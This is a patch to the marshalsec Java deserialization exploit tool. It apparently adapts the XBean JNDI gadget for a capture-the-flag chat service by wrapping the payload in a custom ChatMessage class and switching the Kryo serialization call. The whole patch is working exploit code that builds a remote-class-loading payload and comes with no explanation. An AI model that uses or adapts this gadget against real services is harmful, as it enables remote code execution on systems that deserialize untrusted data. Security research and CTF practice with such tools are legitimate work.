Index: src/main/java/marshalsec/gadgets/XBean.java
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
--- src/main/java/marshalsec/gadgets/XBean.java	(revision ee034266892152adfec0e8be2ebd9f6c9adb50f3)
+++ src/main/java/marshalsec/gadgets/XBean.java	(date 1597011304074)
@@ -32,6 +32,9 @@
 import marshalsec.MarshallerBase;
 import marshalsec.UtilFactory;
 import marshalsec.util.Reflections;
+import ru.mctf.chat.message.ChatMessage;
+
+import java.util.ArrayList;
 
 
 /**
@@ -49,7 +52,16 @@
         Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
         Reference ref = new Reference("foo", args[ 1 ], args[ 0 ]);
         ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);
-        return uf.makeToStringTriggerUnstable(binding); // $NON-NLS-1$
+        Object object = uf.makeToStringTriggerUnstable(binding); // $NON-NLS-1$
+
+        ChatMessage message = new ChatMessage();
+        ArrayList<Object> components = new ArrayList<>();
+        components.add(object);
+
+        message.name = "NAME";
+        message.components = components;
+
+        return message;
     }
 
 }
Index: src/main/java/ru/mctf/chat/message/ChatMessage.java
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
--- src/main/java/ru/mctf/chat/message/ChatMessage.java	(date 1597005724795)
+++ src/main/java/ru/mctf/chat/message/ChatMessage.java	(date 1597005724795)
@@ -0,0 +1,10 @@
+package ru.mctf.chat.message;
+
+import java.util.List;
+
+public class ChatMessage {
+
+    public String name;
+    public List<Object> components;
+
+}
Index: src/main/java/marshalsec/Kryo.java
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
--- src/main/java/marshalsec/Kryo.java	(revision ee034266892152adfec0e8be2ebd9f6c9adb50f3)
+++ src/main/java/marshalsec/Kryo.java	(date 1597010999295)
@@ -52,7 +52,7 @@
         com.esotericsoftware.kryo.Kryo k = makeKryo();
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         try ( Output output = new Output(bos) ) {
-            k.writeClassAndObject(output, o);
+            k.writeObject(output, o);
         }
         return bos.toByteArray();
     }
